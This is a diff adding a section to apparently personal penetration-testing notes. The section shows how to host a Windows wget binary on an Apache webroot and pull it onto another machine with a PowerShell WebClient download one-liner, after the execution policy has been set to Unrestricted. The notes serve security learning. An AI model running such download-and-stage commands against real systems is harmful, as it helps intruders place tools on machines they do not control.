@@ -289,3 +289,19 @@ PS C:\Windows\system32> Set-ExecutionPolicy Unrestricted
 PS C:\Windows\system32> Get-ExecutionPolicy
 Unrestricted
 ```
+### – Powershell File Transfers
+We’ll transfer the windows version of WGET from Alice to Bob using Powershell.
+
+Copy WGET.EXE to our webroot
+```
+sudo cp /usr/share/windows-resources/binaries/wget.exe /var/www/html
+```
+```
+sudo systemctl start apache2
+```
+
+(Powershell)
+```
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://{localIP}/wget.exe','C:\Users\{wget.exe Path}')"
+```
+![image](https://hackmd.io/_uploads/Sk_svOKDC.png)
